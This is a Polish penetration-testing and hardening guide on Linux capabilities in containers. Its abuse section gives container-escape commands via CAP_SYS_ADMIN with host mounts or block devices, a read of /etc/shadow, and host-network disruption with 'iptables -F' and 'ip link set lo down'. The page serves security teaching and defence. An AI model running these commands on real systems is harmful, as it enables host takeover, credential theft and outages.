# Uprawnienia (capabilities) w kontenerach Linux

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

Uprawnienia (Linux capabilities) są jednym z najważniejszych elementów bezpieczeństwa kontenerów, ponieważ odpowiadają na subtelne, lecz fundamentalne pytanie: **co tak naprawdę oznacza „root” wewnątrz kontenera?** Na zwykłym systemie Linux UID 0 historycznie oznaczał bardzo szeroki zestaw uprawnień. W nowoczesnych jądrach ten przywilej został rozbity na mniejsze jednostki zwane capabilities. Proces może działać jako root i jednocześnie nie mieć wielu potężnych możliwości, jeśli odpowiednie capabilities zostały usunięte.

Kontenery w dużym stopniu opierają się na tym rozróżnieniu. Wiele workloadów nadal uruchamia się jako UID 0 wewnątrz kontenera ze względów kompatybilności lub prostoty. Bez usuwania capabilities byłoby to zdecydowanie zbyt niebezpieczne. Po usunięciu części capabilities proces root w kontenerze nadal może wykonywać wiele zwykłych zadań wewnątrz kontenera, jednocześnie mając odmówiony dostęp do bardziej wrażliwych operacji jądra. Dlatego powłoka kontenera pokazująca `uid=0(root)` nie oznacza automatycznie „host root” ani nawet „szerokich uprawnień w jądrze”. Zestawy capabilities decydują, ile takiej tożsamości root rzeczywiście warte.

Dla pełnego odwołania do Linux capabilities i wielu przykładów nadużyć, zobacz:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Działanie

Capabilities są śledzone w kilku zestawach, w tym permitted, effective, inheritable, ambient i bounding. W wielu ocenach kontenerów dokładna semantyka jądra każdego z tych zestawów ma mniejsze znaczenie niż praktyczne pytanie: **jakie uprzywilejowane operacje ten proces może teraz skutecznie wykonać, a jakie przyszłe uzyskiwanie uprawnień jest nadal możliwe?**

To ma znaczenie, ponieważ wiele technik ucieczki z kontenera to w rzeczywistości problemy z capabilities ukryte jako problemy kontenerowe. Workload z `CAP_SYS_ADMIN` może uzyskać dostęp do ogromnej części funkcjonalności jądra, której normalny proces root w kontenerze nie powinien dotykać. Workload z `CAP_NET_ADMIN` staje się znacznie bardziej niebezpieczny, jeśli współdzieli również namespace sieciowy hosta. Workload z `CAP_SYS_PTRACE` robi się ciekawszy, jeśli może zobaczyć procesy hosta przez współdzielenie PID hosta. W Docker lub Podman może to wyglądać jak `--pid=host`; w Kubernetes zwykle pojawia się jako `hostPID: true`.

Innymi słowy, zestawu capabilities nie można oceniać w izolacji. Należy go czytać łącznie z namespaces, seccomp i polityką MAC.

## Laboratorium

Bardzo prosty sposób na sprawdzenie capabilities wewnątrz kontenera to:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Możesz również porównać bardziej restrykcyjny container z takim, któremu dodano wszystkie capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Aby zobaczyć efekt wąskiego dodatku, spróbuj usunąć wszystko i dodać z powrotem tylko jedną capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Te drobne eksperymenty pokazują, że runtime nie po prostu przełącza wartość boolowską nazwaną "privileged". Kształtuje rzeczywistą powierzchnię uprawnień dostępną dla procesu.

## Uprawnienia wysokiego ryzyka

Chociaż wiele capabilities może mieć znaczenie w zależności od celu, kilka z nich pojawia się wielokrotnie w analizach escape'ów z kontenera.

**`CAP_SYS_ADMIN`** to to, czego obrońcy powinni podejrzewać najbardziej. Często opisywany jest jako "the new root", ponieważ odblokowuje ogromną ilość funkcjonalności, w tym operacje związane z mount, zachowania zależne od namespace oraz wiele ścieżek jądra, które nigdy nie powinny być przypadkowo wystawione na kontenery. Jeśli kontener ma `CAP_SYS_ADMIN`, słabe seccomp i brak silnego ograniczenia MAC, wiele klasycznych ścieżek breakout staje się znacznie bardziej realistycznych.

**`CAP_SYS_PTRACE`** ma znaczenie, gdy istnieje widoczność procesów, szczególnie jeśli PID namespace jest współdzielony z hostem lub z interesującymi sąsiednimi obciążeniami. Może przekształcić widoczność w manipulację.

**`CAP_NET_ADMIN`** i **`CAP_NET_RAW`** mają znaczenie w środowiskach zorientowanych na sieć. Na izolowanej sieci typu bridge mogą już być ryzykowne; w przypadku współdzielonego namespace sieci hosta są znacznie gorsze, ponieważ obciążenie może być w stanie rekonfigurować sieć hosta, sniffować, spoofować lub zakłócać lokalne przepływy ruchu.

**`CAP_SYS_MODULE`** zwykle jest katastrofalny w środowisku z uprawnieniami root, ponieważ ładowanie modułów jądra to w praktyce kontrola nad jądrem hosta. Powinien niemal nigdy nie pojawiać się w ogólnym obciążeniu kontenera.

## Użycie w runtime

Docker, Podman, stosy oparte na containerd i CRI-O wszystkie używają kontroli capabilities, ale domyślne ustawienia i interfejsy zarządzania różnią się. Docker udostępnia je bardzo bezpośrednio przez flagi takie jak `--cap-drop` i `--cap-add`. Podman udostępnia podobne kontrolki i często korzysta z wykonywania bez uprawnień root jako dodatkowej warstwy bezpieczeństwa. Kubernetes eksponuje dodawania i usuwania capabilities przez Pod lub container `securityContext`. Środowiska system-container takie jak LXC/Incus również polegają na kontroli capabilities, ale szersza integracja z hostem w tych systemach często skłania operatorów do luźniejszego poluzowania domyślnych ustawień niż w środowisku app-container.

Ta sama zasada obowiązuje we wszystkich z nich: capability, które technicznie można nadać, niekoniecznie powinno być nadane. Wiele rzeczywistych incydentów zaczyna się, gdy operator dodaje capability tylko dlatego, że workload nie działał pod bardziej restrykcyjną konfiguracją i zespół potrzebował szybkiego obejścia.

## Błędne konfiguracje

Najbardziej oczywisty błąd to **`--cap-add=ALL`** w narzędziach CLI typu Docker/Podman, ale to nie jedyny. W praktyce częstszym problemem jest nadanie jednej lub dwóch wyjątkowo potężnych capabilities, szczególnie `CAP_SYS_ADMIN`, aby "sprawić, by aplikacja działała", bez zrozumienia implikacji związanych z namespace, seccomp i mount. Innym częstym trybem awarii jest łączenie dodatkowych capabilities ze współdzieleniem namespace hosta. W Dockerze lub Podman może to wyglądać jak `--pid=host`, `--network=host` lub `--userns=host`; w Kubernetes równoważna ekspozycja zwykle pojawia się przez ustawienia workloadu takie jak `hostPID: true` lub `hostNetwork: true`. Każde z tych połączeń zmienia to, co capability faktycznie może wpływać.

Często też administratorzy wierzą, że ponieważ workload nie jest w pełni `--privileged`, nadal jest znacząco ograniczony. Czasem to prawda, ale czasem efektywna postawa jest już wystarczająco bliska uprawnieniom root, że rozróżnienie przestaje mieć znaczenie operacyjne.

## Nadużycia

Pierwszym praktycznym krokiem jest wyenumerowanie efektywnego zestawu capabilities i natychmiastowe przetestowanie działań specyficznych dla danej capability, które miałyby znaczenie dla escape'a lub dostępu do informacji hosta:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Jeśli `CAP_SYS_ADMIN` jest obecny, najpierw przetestuj mount-based abuse i host filesystem access, ponieważ to jeden z najczęstszych breakout enablers:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Jeśli `CAP_SYS_PTRACE` jest obecny i kontener widzi interesujące procesy, sprawdź, czy tę capability można wykorzystać do inspekcji procesów:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Jeśli `CAP_NET_ADMIN` lub `CAP_NET_RAW` jest obecny, sprawdź, czy workload może manipulować widocznym stosem sieciowym lub przynajmniej zebrać przydatne informacje o sieci:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Gdy test capability się powiedzie, połącz go z kontekstem namespace. Capability wyglądające na jedynie ryzykowne w izolowanym namespace może natychmiast stać się escape lub host-recon primitive, gdy kontener dodatkowo współdzieli host PID, host network lub host mounts.

### Pełny przykład: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Jeśli kontener ma `CAP_SYS_ADMIN` i zapisywalny bind mount systemu plików hosta, taki jak `/host`, ścieżka escape jest często prosta:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Jeśli `chroot` powiedzie się, polecenia będą teraz wykonywane w kontekście systemu plików root hosta:
```bash
id
hostname
cat /etc/shadow | head
```
Jeśli `chroot` jest niedostępny, ten sam efekt można często osiągnąć, uruchamiając plik binarny przez zamontowane drzewo:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Pełny przykład: `CAP_SYS_ADMIN` + dostęp do urządzenia

Jeśli urządzenie blokowe z hosta zostanie wystawione, `CAP_SYS_ADMIN` może przekształcić je w bezpośredni dostęp do systemu plików hosta:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Pełny przykład: `CAP_NET_ADMIN` + Host Networking

Ta kombinacja nie zawsze daje bezpośrednio host root, ale może w pełni przekonfigurować host network stack:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
To może umożliwić denial of service, traffic interception lub dostęp do usług, które wcześniej były filtrowane.

## Sprawdzenia

Celem sprawdzeń capabilities nie jest jedynie wypisanie surowych wartości, lecz zrozumienie, czy proces ma wystarczające uprawnienia, aby jego bieżąca przestrzeń nazw i konfiguracja mountów stały się niebezpieczne.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Co warto tutaj zauważyć:

- `capsh --print` jest najprostszym sposobem na wykrycie wysokiego ryzyka capabilities, takich jak `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, lub `cap_sys_module`.
- Linia `CapEff` w `/proc/self/status` pokazuje, co jest faktycznie aktywne teraz, a nie tylko to, co może być dostępne w innych zbiorach.
- Zrzut capabilities staje się znacznie ważniejszy, jeśli kontener współdzieli z hostem przestrzeń nazw PID, sieciową lub użytkownika, albo ma zapisywalne mounty hosta.

Po zebraniu surowych informacji o capabilities, następnym krokiem jest ich interpretacja. Zadaj pytania: czy proces jest root, czy user namespaces są aktywne, czy przestrzenie nazw hosta są współdzielone, czy seccomp jest wymuszony, oraz czy AppArmor lub SELinux nadal ograniczają proces. Sam zestaw capabilities to tylko część historii, ale często to on wyjaśnia, dlaczego jedno wydostanie się z kontenera działa, a inne nie przy tym samym pozornym punkcie wyjścia.

## Domyślne ustawienia runtime

| Runtime / platforma | Domyślny stan | Domyślne zachowanie | Typowe ręczne osłabienia |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie zredukowany zestaw capabilities | Docker utrzymuje domyślną listę dozwolonych capabilities i usuwa pozostałe | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Domyślnie zredukowany zestaw capabilities | Kontenery Podman są domyślnie nieuprzywilejowane i używają zredukowanego modelu capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Dziedziczy domyślne ustawienia runtime, chyba że zmienione | Jeśli nie określono `securityContext.capabilities`, kontener otrzymuje domyślny zestaw capabilities z runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Zazwyczaj domyślne ustawienia runtime | Rzeczywisty zestaw zależy od runtime oraz specyfikacji Pod | to samo co w wierszu Kubernetes; bezpośrednia konfiguracja OCI/CRI może również jawnie dodać capabilities |

Dla Kubernetes istotne jest, że API nie definiuje jednego uniwersalnego domyślnego zestawu capabilities. Jeśli Pod nie dodaje ani nie usuwa capabilities, obciążenie dziedziczy domyślne ustawienia runtime dla tego węzła.
